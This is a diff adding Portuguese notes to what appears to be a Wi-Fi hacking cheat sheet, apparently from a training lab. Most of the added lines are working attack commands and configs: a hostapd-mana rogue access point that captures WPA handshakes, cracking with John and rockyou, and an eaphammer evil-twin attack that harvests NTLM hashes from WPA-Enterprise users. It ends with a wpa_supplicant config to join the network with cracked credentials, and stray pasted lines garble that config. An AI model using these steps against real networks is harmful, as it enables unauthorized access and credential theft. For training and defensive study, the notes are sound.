@@ -5393,6 +5393,71 @@ Attack de SSID oculto bruteforce para encontrar o SSID - Ele não vai aparecer n
 
 Aparentemente comando para enviar DEAUTH para capturar o WEP password
 
+- ROUGE AP # Técnica para criar um sinal wifi igual ao target e capturar a chave PSK
+Pode ser usado para descobrir chaves e quebrar para descobrir a senha
+
+Passo1 Criar um arquivo propagar o sinal clonado com a ferramenta `hostapd-mana`
+
+	interface=wlan1
+	driver=nl80211
+	hw_mode=g
+	channel=1
+	ssid=sala-402
+	mana_wpaout=hostapd.hccapx
+	wpa=2
+	wpa_key_mgmt=WPA-PSK
+	wpa_pairwise=TKIP CCMP
+	wpa_passphrase=12345678
+
+Salve o arquivo `rougue_ap.conf`
+
+	sudo hostapd-mana rogue_ap.conf
+
+Passo2 Converta a chave para ficar usável pelo jhon
+
+	hccapx2john hostapd.hccapx > hash_sala
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash_sala
+
+- Evil Twin WPA Enterprise
+
+Ataque de Evil Twin
+
+	cd tools/eaphammer
+	sudo python3 ./eaphammer --cert-wizard
+	sudo python3 ./eaphammer -i wlan3 --auth wpa-eap --essid mtia --creds --negotiate balanced
+
+Observar o output da ferramenta e capturar a hash do usuário NTLM
+
+ 	echo 'hahs-ntlm-found' > hash-evil-twin
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash-evil-twin
+
+Após encontrar a senha, se conectar ao roteador da rede
+
+	nano mtia.conf 
+	.
+	network={
+	ssid="mtia"
+	scan_ssid=1
+	key_mgmt=WPA-EAP
+	identity="FLORIPA\gabi.tr"
+	marlon
+	16Wifi Hacking
+	2025-01-20
+	anonymous_identity=""
+	password="Secret!"
+	eap=PEAP
+	phase1="crypto_binding=0 peaplabel=0"
+	phase2="auth=MSCHAPV2"
+	bssid_blacklist=02:00:00:00:01:00
+	}
+
+Conecte-se à rede com o arquivo criado
+
+	sudo wpa_supplicant -D nl80211 -i wlan1 -B -c mtia.conf
+	sudo dhclient wlan1
+	sudo arp-scan -l -I wlan1
+
+ 
 THAT'S ALL FOLKS
 
 ### HANDS ON
